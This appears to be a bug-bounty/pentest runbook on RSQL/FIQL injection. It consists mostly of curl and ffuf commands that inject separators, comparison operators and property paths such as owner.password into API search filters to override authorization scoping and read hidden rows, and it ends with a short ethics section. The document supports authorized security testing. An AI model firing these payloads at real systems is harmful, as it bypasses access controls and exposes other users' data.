---
title: "RSQL Injection"
description: "Injecting into RSQL/FIQL query strings to bypass filters, alter comparisons, and read data the search endpoint should hide."
phase: Web
order: 70
tags:
  - rsql
  - injection
  - api
  - filter
tools:
  - curl
  - ffuf
  - burp suite
updated: 2026-10-01
---

An RSQL injection runbook for bug bounty / authorized pentest on **in-scope** targets only. Goal: find a search/filter endpoint that parses RSQL/FIQL, then inject separators and operators to escalate privileges or read rows the filter should hide.

## 1. Find the filter parameter

```bash
for p in search filter q query; do
  curl -s -o /dev/null -w "$p -> %{http_code}\n" \
    "https://target.com/api/items?$p=id==1"
done
curl -s "https://target.com/api/users?search=name==alice" | jq .
```

## 2. Establish a baseline scope

```bash
curl -s "https://target.com/api/users?search=owner==me" | jq '. | length'
```

## 3. Logic and separator injection

```bash
curl -s "https://target.com/api/users?search=role==user,role==admin" | jq '. | length'
curl -s "https://target.com/api/users?search=id==1;1==1"
curl -s "https://target.com/api/users?search=name==x;(role==admin)"
```

If a fixed owner filter is concatenated without grouping, your `,` can override it.

## 4. Operator abuse and property traversal

```bash
curl -s "https://target.com/api/users?search=id=gt=0"
curl -s "https://target.com/api/users?search=id=in=(1,2,3,4,5)"
curl -s "https://target.com/api/users?search=owner.name==admin"
curl -s "https://target.com/api/users?search=owner.password=gt="
```

Also test `=le=`, `=ge=`, `=out=`, `!=`, and `=like=*` where supported.

## 5. Override the authorization filter

```bash
curl -s "https://target.com/api/users?search=owner==me;owner==victim"
curl -s "https://target.com/api/users?search=owner==me,(owner==victim)"
curl -s "https://target.com/api/users?search=owner==me%29"
```

Automate operator/separator variants:

```bash
ffuf -u "https://target.com/api/users?search=FUZZ" -w rsql.txt -mc all -fs 0
```

## 6. Confirm with proof only

- Compare result counts with and without the injected clause.
- Extract a single proof field, never bulk data.
- Stop when the widened set or error proves the issue.

## Full pipeline

```bash
B="https://target.com/api/users"
for p in search filter q query; do
  curl -s -o /dev/null -w "$p -> %{http_code}\n" "$B?$p=id==1"
done
curl -s "$B?search=owner==me" | jq '. | length'
curl -s "$B?search=role==user,role==admin" | jq '. | length'
curl -s "$B?search=id==1;1==1"
curl -s "$B?search=id=gt=0"
curl -s "$B?search=owner.name==admin"
curl -s "$B?search=owner==me;owner==victim"
curl -s "$B?search=owner==me,owner==victim" | jq '.[0].name'
```

## Ethics & legality

- Only query endpoints and data you are authorized to access.
- Retrieve the minimum proof — one row or field — never bulk data dumps.
- Do not use errors to enumerate sensitive schema beyond what is needed.
- Stop fuzzing once the filter bypass is demonstrated.
